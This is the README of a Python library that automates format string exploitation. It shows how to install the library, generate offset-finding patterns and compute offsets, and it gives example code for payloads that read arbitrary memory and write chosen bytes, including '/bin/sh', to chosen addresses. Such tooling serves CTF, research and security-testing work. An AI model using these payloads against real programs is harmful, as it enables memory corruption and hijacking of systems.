# Formatstring

Formatstring is a **python 3** library to help the exploitation of **format string vulnerabilities**.

## Install

**formatstring** can be installed from PyPI (Python package index) using pip:
```bash
pip install formatstring
```

## Examples

* Generate a pattern to detect the offset of the printed buffer
```bash
$ python formatstring/pattern_create.py 255
ABCDEFGH|%1$p|%2$p|%3$p|%4$p|%5$p|%6$p|%7$p|%8$p|%9$p|%10$p
```

* Compute the offset, given the result of the format string on the previous pattern
```bash
$ python formatstring/pattern_offset.py --arch x86_32
Enter the result of the format string on a pattern given by pattern_create:
ABCDEFGH|0x400|0xf776e5a0|0x4|0x4|0x7|0x1b3220|0x43424120|0x47464544|0x31257c48|0x257c7024
Found buffer at offset 8
```

* Generate a payload to read at a given address
```python
import sys
from formatstring import *

settings = PayloadSettings(offset=8, arch=x86_32)

p = ReadPayload(0x8048590)
sys.stdout.buffer.write(p.generate(settings))
```

* Generate a payload to write at various addresses
```python
import sys
from formatstring import *

settings = PayloadSettings(offset=8, arch=x86_32)

p = WritePayload()
p[0x8049790] = b'/bin/sh\x00'
p[0x80497a8] = struct.pack('@I', 0x01020304)
sys.stdout.buffer.write(p.generate(settings))
```

## Contributors

Author: Maxime Arthaud (maxime@arthaud.me)

## License

formatstring is under The MIT License (MIT)
